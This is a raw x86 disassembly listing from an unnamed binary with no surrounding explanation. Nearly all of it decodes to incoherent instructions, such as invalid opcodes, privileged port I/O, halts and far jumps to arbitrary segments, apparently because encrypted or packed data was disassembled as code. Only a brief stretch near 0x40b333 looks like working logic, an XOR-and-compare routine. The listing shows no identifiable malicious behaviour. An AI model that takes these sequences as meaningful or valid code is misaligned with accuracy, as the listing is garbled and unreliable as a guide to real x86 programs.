  40adce:	pop    DWORD PTR [edi+0x7d47ff09]
  40add4:	push   0x582fbdad
  40add9:	js     0x40adab
  40addb:	or     al,0xa2
  40adde:	sbb    eax,0xdf07fa2b
  40ade3:	in     al,dx
  40ade4:	test   DWORD PTR [esp+ebx*4-0x6059b4b],ebx
  40adeb:	jg     0x40ae13
  40aded:	jbe    0x40adff
  40adef:	push   0x46
  40adf1:	loope  0x40ad7e
  40adf3:	or     bh,BYTE PTR [edi+0x45]
  40adf6:	scas   eax,DWORD PTR es:[edi]
  40adf7:	xor    ebx,ecx
  40adf9:	adc    DWORD PTR [ecx],ebx
  40adfb:	inc    ecx
  40adfc:	ds pop edx
  40adfe:	cmp    ch,al
  40ae00:	idiv   DWORD PTR [ebp+ecx*4+0x3fb33ba7]
  40ae07:	(bad)  
  40ae08:	mov    ebx,DWORD PTR [eax-0xc]
  40ae0b:	je     0x40add2
  40ae0d:	call   0x8404397c
  40ae12:	xchg   ecx,eax
  40ae13:	stos   BYTE PTR es:[edi],al
  40ae14:	retf   
  40ae15:	les    eax,FWORD PTR [edi-0x5614c57c]
  40ae1b:	pop    ecx
  40ae1c:	rcr    DWORD PTR [edx+0x7e],0x57
  40ae20:	(bad)  
  40ae21:	xchg   DWORD PTR [edi-0x54207051],edx
  40ae27:	fwait
  40ae28:	xchg   ebp,eax
  40ae29:	mov    ebx,DWORD PTR [edx-0x1c]
  40ae2c:	add    ebp,ecx
  40ae2e:	mov    edx,0xfd98660d
  40ae33:	xchg   edi,eax
  40ae34:	retf   0x745a
  40ae37:	push   ebp
  40ae38:	daa    
  40ae39:	nop
  40ae3a:	push   ebx
  40ae3b:	cmp    BYTE PTR [eax-0x23],bl
  40ae3e:	xor    eax,0x2da20a8
  40ae43:	loop   0x40ae54
  40ae45:	ss sub eax,0xb71b4eef
  40ae4b:	mov    ebp,0x13e10e82
  40ae50:	fmul   QWORD PTR [ebp+0x60dbe2e5]
  40ae56:	mov    ?,WORD PTR [ebx]
  40ae58:	sbb    al,0xc6
  40ae5a:	push   esp
  40ae5b:	pop    es
  40ae5c:	xchg   DWORD PTR [edx+0x333ee615],edx
  40ae62:	pop    esp
  40ae63:	test   BYTE PTR [edx+0x44],cl
  40ae66:	arpl   sp,sp
  40ae68:	mov    esp,0x4e23cae9
  40ae6d:	mov    edx,0xc96d2661
  40ae72:	test   eax,0x3fb1a7ed
  40ae77:	sahf   
  40ae78:	pop    esi
  40ae79:	mov    bh,0xdc
  40ae7b:	xchg   ecx,eax
  40ae7c:	repz popf 
  40ae7e:	mov    al,ds:0x6bfe03ba
  40ae83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae84:	add    dl,BYTE PTR [edi]
  40ae86:	sbb    eax,0x5930e37
  40ae8b:	mov    WORD PTR [ebx+edx*8+0x3bc6bafa],es
  40ae92:	dec    esp
  40ae93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae94:	cmp    ecx,ecx
  40ae96:	and    eax,ebp
  40ae98:	shl    BYTE PTR [edx+0x1fcf5eb3],0x62
  40ae9f:	lea    esp,[eax+0x402f8867]
  40aea5:	or     al,0xd0
  40aea7:	in     eax,0xe
  40aea9:	add    cl,BYTE PTR [eax]
  40aeab:	popa   
  40aeac:	pop    es
  40aead:	aas    
  40aeae:	loop   0x40ae87
  40aeb0:	jle    0x40ae67
  40aeb2:	dec    ebx
  40aeb3:	cld    
  40aeb4:	fadd   DWORD PTR [eax]
  40aeb6:	aas    
  40aeb7:	xlat   BYTE PTR ds:[ebx]
  40aeb8:	sbb    eax,0x915407af
  40aebd:	(bad)  
  40aebe:	ret    0xbff9
  40aec1:	pop    es
  40aec2:	jmp    0xf377:0xf30b7531
  40aec9:	retf   
  40aeca:	pop    ds
  40aecb:	sti    
  40aecc:	nop
  40aecd:	sbb    eax,0x535b5848
  40aed2:	pop    ecx
  40aed3:	and    BYTE PTR [ebp+0x6b],cl
  40aed6:	rol    DWORD PTR [eax-0x7d1a27d8],1
  40aedc:	xor    al,BYTE PTR cs:[eax+ebp*8-0x23f504f4]
  40aee4:	push   eax
  40aee5:	inc    ebx
  40aee6:	ss inc edx
  40aee8:	xchg   edi,eax
  40aee9:	stos   BYTE PTR es:[edi],al
  40aeea:	dec    eax
  40aeeb:	sar    BYTE PTR [ebx+0x8],0x7c
  40aeef:	pop    esi
  40aef0:	lock ja 0x40aebc
  40aef3:	sub    DWORD PTR [edi-0x41],ebp
  40aef6:	pop    es
  40aef7:	stos   BYTE PTR es:[edi],al
  40aef8:	sbb    eax,0x174e9b7f
  40aefd:	mov    bl,0x81
  40aeff:	push   cs
  40af00:	nop    DWORD PTR [eax+eiz*4]
  40af04:	pop    DWORD PTR [ebp-0x257dcdff]
  40af0a:	mov    bh,0x1a
  40af0c:	gs pushf 
  40af0e:	ja     0x40af89
  40af10:	int    0x44
  40af12:	sub    esi,DWORD PTR [ebp+0x6ea246ca]
  40af18:	cmc    
  40af19:	cmp    dh,bh
  40af1b:	out    0x31,al
  40af1d:	inc    ebp
  40af1e:	scas   eax,DWORD PTR es:[edi]
  40af1f:	(bad)  
  40af20:	mov    BYTE PTR [eax+0x2ed4d89a],dl
  40af26:	adc    DWORD PTR [esp+ecx*1-0x26ce6535],ebx
  40af2d:	ins    DWORD PTR es:[edi],dx
  40af2e:	imul   esi,DWORD PTR [eax+0x39],0xffffffbb
  40af32:	mov    esp,0x86a5290
  40af37:	push   ebp
  40af38:	call   0xc5051f0c
  40af3d:	adc    eax,DWORD PTR [ebx-0x1f78df8d]
  40af43:	add    al,0x9b
  40af45:	cmp    BYTE PTR ss:[esi+ecx*1+0xd],bh
  40af4a:	dec    eax
  40af4b:	cmp    bh,0x76
  40af4e:	and    dl,BYTE PTR [ebp-0x2cb8d97f]
  40af54:	loope  0x40af7f
  40af56:	dec    esp
  40af57:	or     al,0xc4
  40af59:	lds    eax,FWORD PTR [esi-0x4e]
  40af5c:	and    eax,0xe94244af
  40af61:	and    DWORD PTR [ebx-0x3fe8d38d],esi
  40af67:	js     0x40af99
  40af69:	xor    eax,0xccbcd97b
  40af6e:	or     al,0x5d
  40af70:	pop    esi
  40af71:	out    0xd8,eax
  40af73:	and    BYTE PTR [eax+0xa9940f3],0x7e
  40af7a:	call   0x1c40:0xead1ec5e
  40af81:	cli    
  40af82:	fsubr  QWORD PTR [ebp+0x47]
  40af85:	sub    DWORD PTR [edx+0x7a],eax
  40af88:	jp     0x40af4d
  40af8a:	adc    DWORD PTR ds:0x4cd124e2,ebx
  40af90:	retf   
  40af91:	dec    esp
  40af92:	cmp    al,0xab
  40af94:	rcl    DWORD PTR [eax],cl
  40af96:	cmp    dl,BYTE PTR [esi-0x3e]
  40af99:	fldcw  WORD PTR ss:[ecx]
  40af9c:	xor    dh,BYTE PTR [edi-0x64]
  40af9f:	add    DWORD PTR [eax+0x7e16ae3e],0xfffffff1
  40afa6:	rol    BYTE PTR [ecx+0xc],0x8c
  40afaa:	arpl   WORD PTR [eax+0x1f],dx
  40afad:	mov    ebx,0xe8ef9fd3
  40afb2:	push   ss
  40afb3:	sbb    DWORD PTR [edi+0x23a30055],esi
  40afb9:	push   edi
  40afba:	aam    0x81
  40afbc:	loope  0x40afa7
  40afbe:	mov    ch,BYTE PTR [ebx+ebp*4+0x6f7c8838]
  40afc5:	pop    edi
  40afc6:	outs   dx,DWORD PTR ds:[esi]
  40afc7:	shr    BYTE PTR [edi-0x29],cl
  40afca:	xchg   cl,al
  40afcc:	lods   al,BYTE PTR ds:[esi]
  40afcd:	xor    eax,0x8bf45d89
  40afd2:	add    BYTE PTR [esi-0x75],ah
  40afd5:	dec    ebp
  40afd6:	cld    
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     al,BYTE PTR [ecx+0x792cce8b]
  40affc:	call   0x7d6f2e7f
  40b001:	jle    0x40b081
  40b003:	adc    DWORD PTR [ecx],ebx
  40b005:	icebp  
  40b006:	cld    
  40b007:	xor    DWORD PTR [ebx+0x458fee01],edi
  40b00d:	or     ch,BYTE PTR [eax-0x5c]
  40b010:	sub    eax,0x737b2ea2
  40b015:	not    cl
  40b017:	ja     0x40affa
  40b019:	jge    0x40b003
  40b01b:	je     0x40b058
  40b01d:	mov    edi,0xb0d6dd73
  40b022:	inc    ebp
  40b023:	mov    edi,0xbf0d7173
  40b028:	add    dl,ch
  40b02a:	sbb    eax,0x3ed31b7a
  40b02f:	inc    edx
  40b030:	(bad)  [esi+0x5f]
  40b033:	adc    BYTE PTR [ebp+0x1fef41c0],0x2e
  40b03a:	sahf   
  40b03b:	push   ebx
  40b03c:	cmc    
  40b03d:	das    
  40b03e:	fmulp  st(3),st
  40b040:	outs   dx,BYTE PTR ds:[esi]
  40b041:	mov    eax,ds:0x36dae20c
  40b046:	test   al,0x7c
  40b048:	hlt    
  40b049:	and    BYTE PTR [ecx+0x3871c499],cl
  40b04f:	push   edx
  40b050:	pop    ebp
  40b051:	jmp    0x40b058
  40b053:	jle    0x40b085
  40b055:	(bad)  
  40b056:	cmc    
  40b057:	or     BYTE PTR [edi+0x6a],dl
  40b05a:	je     0x40b027
  40b05c:	daa    
  40b05d:	and    esp,DWORD PTR [edx-0x7]
  40b060:	push   esp
  40b061:	adc    bl,BYTE PTR [ebp-0x18]
  40b064:	sub    DWORD PTR ds:0xfd74423a,0x7a
  40b06b:	sbb    BYTE PTR [eax-0x3dae58ba],dh
  40b071:	adc    cl,BYTE PTR [edx+eiz*8+0x1760e364]
  40b078:	dec    esi
  40b079:	or     BYTE PTR [eax+ebx*2+0x3],0x8d
  40b07e:	xor    DWORD PTR [edx],edi
  40b080:	add    eax,0xdce2d226
  40b085:	sub    DWORD PTR [edi-0x5c],esi
  40b088:	call   0x44c40392
  40b08d:	loopne 0x40b068
  40b08f:	mov    bh,0xe4
  40b091:	jp     0x40b04a
  40b093:	pusha  
  40b094:	fwait
  40b095:	jmp    0x40b045
  40b097:	and    BYTE PTR [edi+0x3a],bh
  40b09a:	and    al,0x64
  40b09c:	(bad)  
  40b09d:	out    dx,eax
  40b09e:	xchg   ebp,eax
  40b09f:	(bad)  
  40b0a0:	int    0xca
  40b0a2:	mov    eax,0xc18903e7
  40b0a7:	repnz stos DWORD PTR es:[edi],eax
  40b0a9:	push   ecx
  40b0aa:	imul   edi,esp,0xc7466899
  40b0b0:	jmp    0x40b0d4
  40b0b2:	inc    edx
  40b0b3:	jmp    0x40b119
  40b0b5:	imul   DWORD PTR [ebx+0x41]
  40b0b8:	loope  0x40b0a5
  40b0ba:	(bad)  
  40b0bb:	shl    BYTE PTR [eax+0xe],0x14
  40b0bf:	loope  0x40b111
  40b0c1:	xchg   BYTE PTR [ebx-0x18],dh
  40b0c4:	mov    bh,0x71
  40b0c6:	repz jns 0x40b09a
  40b0c9:	and    al,0x40
  40b0cb:	and    cl,ah
  40b0cd:	stos   DWORD PTR es:[edi],eax
  40b0ce:	hlt    
  40b0cf:	rcl    DWORD PTR [ecx],1
  40b0d1:	data16 fdiv QWORD PTR [eax-0x3b]
  40b0d5:	add    ebp,DWORD PTR [ecx]
  40b0d7:	cdq    
  40b0d8:	adc    DWORD PTR [eax-0x13],ebx
  40b0db:	call   0x29b7fdc7
  40b0e0:	lods   eax,DWORD PTR ds:[esi]
  40b0e1:	fistp  QWORD PTR [eax]
  40b0e3:	jns    0x40b147
  40b0e5:	adc    ebp,ebx
  40b0e7:	clc    
  40b0e8:	dec    esi
  40b0e9:	into   
  40b0ea:	(bad)  
  40b0ec:	jne    0x40b110
  40b0ee:	cmp    ch,BYTE PTR [edi+eiz*2+0x42]
  40b0f2:	add    eax,0xfbb5814d
  40b0f7:	jo     0x40b100
  40b0f9:	inc    esp
  40b0fa:	call   0xd932:0xd6bdaad4
  40b101:	ret    0xbc9c
  40b104:	pop    esi
  40b105:	mov    bh,0xbd
  40b107:	mov    eax,ds:0xc38b566f
  40b10c:	hlt    
  40b10d:	shl    BYTE PTR [esi+0x7d],cl
  40b110:	repnz in eax,dx
  40b112:	add    cl,ah
  40b114:	dec    ebx
  40b115:	std    
  40b116:	mov    cl,BYTE PTR [edi-0x63]
  40b119:	aam    0x5f
  40b11b:	popf   
  40b11c:	cmp    ch,0xef
  40b11f:	fistp  QWORD PTR [edx+0x69]
  40b122:	cmc    
  40b123:	xchg   ebx,eax
  40b124:	sub    eax,0x831d13e9
  40b129:	xchg   BYTE PTR [eax+0x51],bl
  40b12c:	add    BYTE PTR [ecx-0x66],ah
  40b12f:	rcl    BYTE PTR [esi+edi*4],1
  40b132:	pop    ebx
  40b133:	ret    0xeab9
  40b136:	loopne 0x40b0d9
  40b138:	mov    bh,0xbd
  40b13a:	adc    ebp,DWORD PTR [edx-0x3d870e99]
  40b140:	les    ebx,FWORD PTR [ecx+0x7f0784b1]
  40b146:	jmp    0xf951:0x6c81ce50
  40b14d:	jle    0x40b1b8
  40b14f:	ficomp WORD PTR [ebp+0x62a30a9e]
  40b155:	test   edi,ecx
  40b157:	ins    DWORD PTR es:[edi],dx
  40b158:	push   0x1d
  40b15a:	in     eax,dx
  40b15b:	add    DWORD PTR [edx-0x50d681fa],eax
  40b161:	rcr    bh,cl
  40b163:	shl    DWORD PTR [eax-0x10],1
  40b166:	enter  0xb11d,0xdc
  40b16a:	gs add bh,al
  40b16d:	hlt    
  40b16e:	daa    
  40b16f:	sti    
  40b170:	dec    ebx
  40b171:	enter  0xa784,0x28
  40b175:	fsubr  DWORD PTR ss:[ecx]
  40b178:	pusha  
  40b179:	es loopne 0x40b1ee
  40b17c:	scas   al,BYTE PTR es:[edi]
  40b17d:	mov    eax,ds:0xedd3a614
  40b182:	mov    dh,0xcb
  40b184:	ffreep st(5)
  40b186:	pop    edi
  40b187:	hlt    
  40b188:	mov    ebp,0x51787e26
  40b18d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b18e:	leave  
  40b18f:	out    0x6a,al
  40b191:	pop    esp
  40b192:	pop    edi
  40b193:	sub    edx,DWORD PTR [edi-0x14]
  40b196:	test   eax,0xebf19814
  40b19b:	call   0x86eb5723
  40b1a0:	pop    es
  40b1a1:	jmp    FWORD PTR fs:[edi-0x5b4ad47f]
  40b1a8:	test   DWORD PTR [eax+0x7acc8425],esi
  40b1ae:	int3   
  40b1af:	pop    es
  40b1b0:	dec    ecx
  40b1b1:	icebp  
  40b1b2:	retf   0x217d
  40b1b5:	push   esi
  40b1b6:	add    DWORD PTR [esi],ebp
  40b1b8:	xchg   esi,eax
  40b1b9:	stc    
  40b1ba:	pop    ecx
  40b1bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1bc:	(bad)  
  40b1bd:	aas    
  40b1be:	pop    eax
  40b1bf:	mov    ebp,DWORD PTR [edx-0x1acfe4fd]
  40b1c5:	sar    DWORD PTR [ecx],0xbf
  40b1c8:	pop    ss
  40b1c9:	das    
  40b1ca:	out    dx,al
  40b1cb:	bound  ebx,QWORD PTR ds:0x26b82f2
  40b1d1:	out    dx,eax
  40b1d2:	mov    ds:0xbf1a822b,eax
  40b1d7:	push   esi
  40b1d8:	test   eax,0xd9d5d436
  40b1dd:	mov    al,0xd
  40b1df:	inc    ebp
  40b1e0:	jp     0x40b1aa
  40b1e2:	mov    esp,0x5c9b8867
  40b1e7:	adc    ch,0x6f
  40b1ea:	adc    ecx,ecx
  40b1ec:	sub    dh,BYTE PTR [edx+0x43b7996a]
  40b1f2:	cmp    ebp,esp
  40b1f4:	push   ecx
  40b1f5:	sti    
  40b1f6:	dec    esp
  40b1f7:	push   esp
  40b1f8:	fadd   DWORD PTR [edx+0x56220b2b]
  40b1fe:	sub    ebx,DWORD PTR [edi+0x15b60852]
  40b204:	dec    ecx
  40b205:	lea    esi,[edi]
  40b207:	jmp    0x2581:0xb549a165
  40b20e:	loopne 0x40b1da
  40b210:	sub    al,0x1e
  40b212:	lock jg 0x40b1a9
  40b215:	stc    
  40b216:	add    BYTE PTR [ebx-0x65],al
  40b219:	loop   0x40b277
  40b21b:	or     ebx,ebx
  40b21d:	sar    WORD PTR [ecx+0x37036017],cl
  40b224:	nop
  40b225:	pop    ebx
  40b226:	enter  0xea37,0xe9
  40b22a:	inc    esp
  40b22b:	push   es
  40b22c:	aaa    
  40b22d:	loop   0x40b203
  40b22f:	clc    
  40b230:	ins    BYTE PTR es:[edi],dx
  40b231:	outs   dx,BYTE PTR ds:[esi]
  40b232:	stos   DWORD PTR es:[edi],eax
  40b233:	push   ds
  40b234:	or     BYTE PTR [ebp-0x201cf601],dh
  40b23a:	cdq    
  40b23b:	push   ds
  40b23c:	xor    ah,BYTE PTR [edi]
  40b23e:	retf   0x8639
  40b241:	fisub  WORD PTR [ebx-0x5c7d343d]
  40b247:	xchg   edi,eax
  40b248:	sbb    BYTE PTR [ecx],bl
  40b24a:	add    eax,0x894dcb51
  40b24f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b250:	jb     0x40b25a
  40b252:	mov    eax,ds:0xdc82031a
  40b257:	sti    
  40b258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b259:	mov    ds:0xedbc9827,al
  40b25e:	mov    cl,0x2a
  40b260:	fisttp WORD PTR [eax-0x6d]
  40b263:	int3   
  40b264:	sub    eax,0xc9cd559f
  40b269:	test   BYTE PTR [ebx-0x5e5c1dbe],al
  40b26f:	call   0x1b2:0xc7cc
  40b275:	jl     0x40b2a1
  40b277:	neg    cl
  40b279:	push   ds
  40b27a:	in     eax,0x76
  40b27c:	jo     0x40b23a
  40b27e:	aad    0x6e
  40b280:	sti    
  40b281:	or     eax,0x49f91b2f
  40b286:	mov    esp,0x81ffc2d7
  40b28b:	test   DWORD PTR [ebp+esi*8-0x79],ecx
  40b28f:	pop    esp
  40b290:	sbb    DWORD PTR [eax],0xffffffe4
  40b293:	imul   esp,DWORD PTR [eax*8-0x7092134b],0xfffffffc
  40b29b:	in     al,0x13
  40b29d:	pop    ds
  40b29e:	outs   dx,DWORD PTR ds:[esi]
  40b29f:	es je  0x40b311
  40b2a2:	pop    ss
  40b2a3:	repnz cld 
  40b2a5:	fldenv [eax]
  40b2a7:	jmp    0x917f9ee3
  40b2ac:	or     al,0x88
  40b2ae:	outs   dx,DWORD PTR ds:[esi]
  40b2af:	js     0x40b2e5
  40b2b1:	jmp    0x2a6e4264
  40b2b6:	mov    esi,0x6a329031
  40b2bb:	or     esi,DWORD PTR [esi-0x2a104b48]
  40b2c1:	add    ebp,0x23548cb
  40b2c7:	ret    0xd65e
  40b2ca:	std    
  40b2cb:	cmp    eax,0x1eb3aa06
  40b2d0:	fist   DWORD PTR [edx+0x304b628c]
  40b2d6:	cmp    DWORD PTR [edi+0x1a],ecx
  40b2d9:	pop    esp
  40b2da:	hlt    
  40b2db:	gs cmp al,0x16
  40b2de:	(bad)  
  40b2df:	hlt    
  40b2e0:	ja     0x40b27e
  40b2e2:	mov    ds:0xdc0c9928,eax
  40b2e7:	scas   al,BYTE PTR es:[edi]
  40b2e8:	dec    esp
  40b2e9:	ret    
  40b2ea:	mov    edi,DWORD PTR [esi-0x8]
  40b2ed:	or     al,0x1d
  40b2ef:	xchg   edx,eax
  40b2f0:	inc    edi
  40b2f1:	mov    al,ds:0xb3185ab
  40b2f6:	xchg   edi,eax
  40b2f7:	add    ebp,edi
  40b2f9:	push   ss
  40b2fa:	xlat   BYTE PTR ds:[ebx]
  40b2fb:	or     esi,DWORD PTR [eax+0x64]
  40b2fe:	sbb    ecx,DWORD PTR [eax+0x11]
  40b301:	and    ecx,ebp
  40b303:	xchg   edx,eax
  40b304:	adc    al,0x3b
  40b306:	pop    esp
  40b307:	adc    DWORD PTR [edi],ebp
  40b309:	add    esi,DWORD PTR [eax+0x63f21190]
  40b30f:	out    dx,eax
  40b310:	inc    edx
  40b311:	adc    esp,DWORD PTR ds:[ebx]
  40b314:	and    DWORD PTR [ecx-0x61627874],esi
  40b31a:	dec    edx
  40b31b:	lods   eax,DWORD PTR ds:[esi]
  40b31c:	jge    0x40b2bf
  40b31e:	test   al,0x76
  40b320:	fst    DWORD PTR [ecx-0x20379dcc]
  40b326:	leave  
  40b327:	div    ebp
  40b329:	adc    dl,ch
  40b32b:	fsub   DWORD PTR [ecx+0x5d621527]
  40b331:	or     DWORD PTR [esi],eax
  40b333:	mov    eax,DWORD PTR [ebp+0x8]
  40b336:	mov    ecx,DWORD PTR [ebp-0x8]
  40b339:	xor    eax,esi
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	pop    ebx
  40b375:	push   es
  40b376:	and    eax,0x7ef7292f
  40b37b:	jle    0x40b3ab
  40b37d:	jge    0x40b3fd
  40b37f:	jle    0x40b35d
  40b381:	fstp   QWORD PTR [edx]
  40b383:	dec    ebx
  40b384:	(bad)  
  40b385:	int    0x7d
  40b387:	inc    ebp
  40b388:	lock stc 
  40b38a:	adc    eax,0xab19fe96
  40b38f:	ss push ecx
  40b391:	adc    esi,DWORD PTR [ebx-0x50c61269]
  40b397:	fisub  DWORD PTR [eax+ebp*8-0x6b749621]
  40b39e:	test   BYTE PTR [edx],cl
  40b3a0:	lods   eax,DWORD PTR ds:[esi]
  40b3a1:	repnz and DWORD PTR [ecx-0x4da8f8fd],edi
  40b3a8:	push   edi
  40b3a9:	ror    BYTE PTR [esi+0x64],cl
  40b3ac:	push   ds
  40b3ad:	mov    edi,0x29552131
  40b3b2:	dec    esp
  40b3b3:	mov    cl,0x8c
  40b3b5:	and    edi,ecx
  40b3b7:	jl     0x40b3a9
  40b3b9:	and    BYTE PTR [ebx-0x19c7c023],cl
  40b3bf:	pop    es
  40b3c0:	leave  
  40b3c1:	mov    BYTE PTR [eax+0x76],al
  40b3c4:	pop    ebx
  40b3c5:	xor    al,0x3b
  40b3c7:	xchg   edx,eax
  40b3c8:	inc    esi
  40b3c9:	loopne 0x40b370
  40b3cb:	test   DWORD PTR [ebp+0x39d8cb37],0xc68c4489
  40b3d5:	sbb    bl,bh
  40b3d7:	imul   edi,DWORD PTR [esi+0x321f227e],0x5f
  40b3de:	xchg   esi,eax
  40b3df:	je     0x40b3b4
  40b3e1:	out    dx,eax
  40b3e2:	xchg   esp,eax
  40b3e3:	es add eax,0xdfbc697a
  40b3e9:	cwde   
  40b3ea:	mov    bl,BYTE PTR [edx-0x1cb1885c]
  40b3f0:	pop    ss
  40b3f1:	mov    eax,ds:0x89c98829
  40b3f6:	pop    ss
  40b3f7:	xchg   edi,eax
  40b3f8:	(bad)  
  40b3f9:	cdq    
  40b3fa:	pusha  
  40b3fb:	dec    edx
  40b3fc:	dec    esi
  40b3fd:	mov    cs,WORD PTR [edi]
  40b3ff:	ins    DWORD PTR es:[edi],dx
  40b400:	xchg   ebx,eax
  40b401:	sar    BYTE PTR [eax],0xc2
  40b404:	dec    edx
  40b405:	add    BYTE PTR [edx-0x55],cl
  40b408:	xsha1  (bad)
  40b409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b40a:	mov    es,WORD PTR [edi+0x3575db13]
  40b410:	idiv   ecx
  40b412:	dec    esi
  40b413:	scas   eax,DWORD PTR es:[edi]
  40b414:	cmp    ebp,DWORD PTR [edi]
  40b416:	mov    ss,WORD PTR [ebp+0x9]
  40b419:	push   ds
  40b41a:	xor    al,0x4a
  40b41c:	dec    eax
  40b41d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b41e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b41f:	mov    bh,0xa9
  40b421:	imul   ebx,DWORD PTR [eax-0x34168cfe],0x44cb1669
  40b42b:	sub    DWORD PTR [edx-0x685928b1],ebx
  40b431:	push   edi
  40b432:	and    dl,BYTE PTR [eax]
  40b434:	(bad)  
  40b435:	jl     0x40b46a
  40b437:	jno    0x40b3f6
  40b439:	jne    0x40b494
  40b43b:	fnstenv [ecx]
  40b43d:	dec    eax
  40b43e:	call   0xaf996340
  40b443:	jg     0x40b3e3
  40b445:	push   edi
  40b446:	xchg   ebp,eax
  40b447:	loop   0x40b432
  40b449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b44a:	nop
  40b44b:	mov    ds:0xe822ff5,eax
  40b450:	and    bl,al
  40b452:	jnp    0x40b463
  40b454:	dec    edi
  40b455:	inc    edi
  40b456:	shl    bl,0xb7
  40b459:	test   DWORD PTR [edi],ebx
  40b45b:	bound  ebx,QWORD PTR [ecx+0x667b4071]
  40b461:	sbb    dl,BYTE PTR [edi*4-0x7df77291]
  40b468:	xchg   esi,eax
  40b469:	div    BYTE PTR [ecx+edx*2+0x62]
  40b46d:	ins    DWORD PTR es:[edi],dx
  40b46e:	push   0xffffff9c
  40b470:	and    ch,BYTE PTR [edx+0x58]
  40b473:	pop    ebx
  40b474:	inc    edx
  40b475:	jno    0x40b47e
  40b477:	jo     0x40b4f5
  40b479:	and    eax,0x5abe707e
  40b47e:	iret   
  40b47f:	dec    esp
  40b480:	shr    DWORD PTR [ebx-0x29429153],1
  40b486:	or     edi,DWORD PTR [edi-0x2b]
  40b489:	stos   DWORD PTR es:[edi],eax
  40b48a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b48b:	mov    al,0x87
  40b48d:	stc    
  40b48e:	add    DWORD PTR [ebp+0xb459ec],edi
  40b494:	push   eax
  40b495:	out    0x38,eax
  40b497:	xchg   cl,dl
  40b499:	mov    ebp,0x9f68ca9c
  40b49e:	cmp    bh,bh
  40b4a0:	in     al,0x9b
  40b4a2:	cmp    al,0x4a
  40b4a4:	cmp    al,0x91
  40b4a6:	adc    DWORD PTR [ebx],esp
  40b4a8:	mov    esi,0x6e99f83c
  40b4ad:	mov    bh,0x57
  40b4af:	repnz mov eax,0xf0902474
  40b4b5:	lds    eax,FWORD PTR [edx-0x2a]
  40b4b8:	repnz jecxz 0x40b49f
  40b4bb:	dec    ebp
  40b4bc:	std    
  40b4bd:	add    al,0x46
  40b4bf:	pop    esp
  40b4c0:	and    ebp,ecx
  40b4c2:	int3   
  40b4c3:	jp     0x40b48f
  40b4c5:	jl     0x8dd68b86
  40b4cb:	ret    0x80f6
  40b4ce:	test   BYTE PTR [esi],bl
  40b4d0:	sbb    edi,edx
  40b4d2:	push   edi
  40b4d3:	fsubr  st,st(3)
  40b4d5:	jbe    0x40b45f
  40b4d7:	test   al,0x15
  40b4d9:	mov    ah,BYTE PTR [ecx-0x65]
  40b4dc:	es sub eax,0xd3d95a96
  40b4e2:	push   edx
  40b4e3:	lds    edi,FWORD PTR [ebp+0x62e3ec48]
  40b4e9:	pop    edi
  40b4ea:	inc    esp
  40b4ec:	lods   eax,DWORD PTR cs:[esi]
  40b4ee:	pop    ds
  40b4ef:	pop    edx
  40b4f0:	fnsave [eax]
  40b4f2:	fldenv [ebx-0x2b245a2f]
  40b4f8:	nop
  40b4f9:	cmp    BYTE PTR [ebp+ebp*8-0x3d27f16a],0x79
  40b501:	mov    dl,0x3b
  40b503:	outs   dx,BYTE PTR ds:[esi]
  40b504:	daa    
  40b505:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b506:	out    dx,al
  40b507:	in     eax,0x9f
  40b509:	jne    0x40b553
  40b50b:	sub    esi,esp
  40b50d:	repnz enter 0x7485,0x90
  40b512:	xor    ch,ah
  40b514:	jne    0x40b4db
  40b516:	cmp    ebx,edx
  40b518:	xor    DWORD PTR [eax+0x2c],esp
  40b51b:	dec    esp
  40b51c:	out    0x8e,eax
  40b51e:	push   esi
  40b51f:	(bad)  
  40b520:	in     eax,dx
  40b521:	stc    
  40b522:	xor    edi,DWORD PTR [ecx+esi*4]
  40b525:	push   eax
  40b526:	push   es
  40b527:	aaa    
  40b528:	icebp  
  40b529:	xor    DWORD PTR [edi-0x53d87a99],0x67
  40b530:	clc    
  40b531:	fwait
  40b532:	ins    DWORD PTR es:[edi],dx
  40b533:	test   bl,0xf5
  40b536:	adc    al,0x22
  40b539:	push   esi
  40b53a:	sbb    edi,DWORD PTR [ebx-0x5d92116e]
  40b540:	mov    dl,0xad
  40b542:	js     0x40b4de
  40b544:	nop
  40b545:	mov    DWORD PTR [esp+eiz*8],ebp
  40b548:	sbb    DWORD PTR [ebp-0x14e700cf],esi
  40b54e:	mov    cl,0xc8
  40b550:	jo     0x40b54a
  40b552:	bound  ebx,QWORD PTR [edx+esi*2-0xa341283]
  40b559:	cmp    BYTE PTR [eax+0x6d327667],dl
  40b55f:	hlt    
  40b560:	mov    ds:0x67251117,al
  40b565:	or     BYTE PTR [eax-0x4],dl
  40b568:	popa   
